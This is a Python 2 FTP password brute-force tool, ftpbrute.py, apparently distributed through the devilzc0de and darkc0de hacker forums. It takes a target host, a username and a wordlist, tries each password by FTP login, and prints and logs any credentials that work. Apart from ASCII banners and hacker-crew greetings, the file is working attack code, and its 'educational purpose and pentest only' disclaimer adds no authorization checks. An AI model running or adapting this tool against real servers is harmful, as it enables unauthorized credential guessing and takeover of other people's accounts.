#!/usr/bin/python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################
# This is ftp brute force tools .
# This was written for educational purpose and pentest only. Use it at your own risk.
# Suggestion ! don't use very large wordlist, because system need to read it first for a while and do it @ brute time... "that's cause LOSS" maybe you can use time.sleep(int) 
# VISIT : http://www.devilzc0de.com
# CODING BY : gunslinger_
# EMAIL : gunslinger.devilzc0de@gmail.com
# TOOL NAME : ftpbrute.py v1.0
# Big thanks darkc0de member : d3hydr8, Kopele, icedzomby, VMw4r3 and all member
# Special thanks to devilzc0de crew : mywisdom, petimati, peneter, flyff666, rotlez, 7460, xtr0nic, devil_nongkrong, cruzen and all devilzc0de family 
# Greetz : all member of jasakom.com, jatimcrew.com
# Special i made for jasakom member and devilzc0de family
# Please remember... your action will be logged in target system...
# Author will not be responsible for any damage !!
# Use it with your own risk 

import sys
import time
import os
from ftplib import FTP

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

log = "ftpbrute.log"

file = open(log, "a")
def MyFace() :
	os.system(SysCls)
	print "\n            .___             .__ .__                  _______       .___                                       				"
	print "          __| _/ ____ ___  __|__||  |  ________  ____ \   _  \    __| _/ ____     ____ _______   ____ __  _  __				"
	print "         / __ |_/ __ \\\  \/ /|  ||  |  \___   /_/ ___\/  /_\  \  / __ |_/ __ \  _/ ___\\\_  __ \_/ __ \\\ \/ \/ /			"
	print "        / /_/ |\  ___/ \   / |  ||  |__ /    / \  \___\  \_/   \/ /_/ |\  ___/  \  \___ |  | \/\  ___/ \     / 				"
	print "        \____ | \___  > \_/  |__||____//_____ \ \___  >\_____  /\____ | \___  >  \___  >|__|    \___  > \/\_/  				"
	print "             \/     \/                       \/     \/       \/      \/     \/       \/             \/         				"
	print "												http://www.devilzc0de.com			"
	print "												by : gunslinger_				"
	print " ftpbrute.py version 1.0                                     										"
	print " Brute forcing ftp target     														"
	print " Programmmer : gunslinger_                                    										"
	print " gunslinger[at]devilzc0de[dot]com                             										"
	print "_______________________________________________________________________________________________________________________________________\n"
	file.write("\n            .___             .__ .__                  _______       .___                                       				")
	file.write("\n          __| _/ ____ ___  __|__||  |  ________  ____ \   _  \    __| _/ ____     ____ _______   ____ __  _  __				")
	file.write("\n         / __ |_/ __ \\\  \/ /|  ||  |  \___   /_/ ___\/  /_\  \  / __ |_/ __ \  _/ ___\\\_  __ \_/ __ \\\ \/ \/ /			")
	file.write("\n        / /_/ |\  ___/ \   / |  ||  |__ /    / \  \___\  \_/   \/ /_/ |\  ___/  \  \___ |  | \/\  ___/ \     / 				")
	file.write("\n        \____ | \___  > \_/  |__||____//_____ \ \___  >\_____  /\____ | \___  >  \___  >|__|    \___  > \/\_/  				")
	file.write("\n             \/     \/                       \/     \/       \/      \/     \/       \/             \/         				")
	file.write("\n												http://www.devilzc0de.com			")
	file.write("\n												by : gunslinger_				")
	file.write("\n ftpbrute.py version 1.0                                     										")
	file.write("\n Brute forcing ftp target     														")
	file.write("\n Programmmer : gunslinger_                                    										")
	file.write("\n gunslinger[at]devilzc0de[dot]com                             										")
	file.write("\n_______________________________________________________________________________________________________________________________________\n")


def HelpMe() :
	MyFace()
	print 'Usage: ./ftpbrute.py [options]\n'
    	print 'Options: -t, --target    <hostname/ip>   |   Target to bruteforcing '
    	print '         -u, --user      <user>          |   User for bruteforcing'
    	print '         -w, --wordlist  <filename>      |   Wordlist used for bruteforcing'
    	print '         -h, --help      <help>          |   print this help'
    	print '                                        					\n' 
    	print 'Example: ./ftpbrute.py -t 192.168.1.1 -u root -w wordlist.txt		\n'
	file.write( '\nUsage: ./ftpbrute.py [options]')
    	file.write( '\nOptions: -t, --target    <hostname/ip>   |   Target to bruteforcing ')
    	file.write( '\n         -u, --user      <user>          |   User for bruteforcing')
    	file.write( '\n         -w, --wordlist  <filename>      |   Wordlist used for bruteforcing')
    	file.write( '\n         -h, --help      <help>          |   print this help')
    	file.write( '\n     maybe you can use time.sleep(int)                                    					\n') 
    	file.write( '\nExample: ./ftpbrute.py -t 192.168.1.1 -u root -w wordlist.txt		\n')
	sys.exit(1)

for arg in sys.argv:
	if arg.lower() == '-t' or arg.lower() == '--target':
            hostname = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-u' or arg.lower() == '--user':
            user = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-w' or arg.lower() == '--wordlist':
            wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-h' or arg.lower() == '--help':
        	HelpMe()
	elif len(sys.argv) <= 1:
		HelpMe()
		

def BruteForce(word) :
	print "[?]Trying :",word
	file.write("\n[?]Trying :"+word)
     	try:
		ftp = FTP(hostname)
		ftp.login(user, word)
		ftp.retrlines('list')
		ftp.quit()
		print "\n\t[!] Login Success ! "
		print "\t[!] Username : ",user, ""
		print "\t[!] Password : ",word, ""
		print "\t[!] Hostname : ",hostname, ""
		print "\t[!] Log all has been saved to",log,"\n"
		file.write("\n\n\t[!] Login Success ! ")
		file.write("\n\t[!] Username : "+user )
		file.write("\n\t[!] Password : "+word )
		file.write("\n\t[!] Hostname : "+hostname)
		file.write("\n\t[!] Log all has been saved to "+log)
		sys.exit(1)
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Aborting...\n"
		file.write("\n[-] Aborting...\n")
		sys.exit(1)

def Action ():
	MyFace()
	print "[!] Starting attack at %s" % time.strftime("%X")
	print "[!] System Activated for brute forcing..."
	print "[!] Please wait until brute forcing finish !\n"
	file.write("\n[!] Starting attack at %s" % time.strftime("%X"))
	file.write("\n[!] System Activated for brute forcing...")
	file.write("\n[!] Please wait until brute forcing finish !\n")

Action()
	

try:
	words = open(wordlist, "r").readlines()
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
	file.write("\n[-] Error: Check your wordlist path\n")
  	sys.exit(1)

print "\n[+] Loaded:",len(words),"words"
print "[+] Server:",hostname
print "[+] User:",user
print "[+] BruteForcing...\n"
for word in words:
	BruteForce(word.replace("\n",""))

file.close()
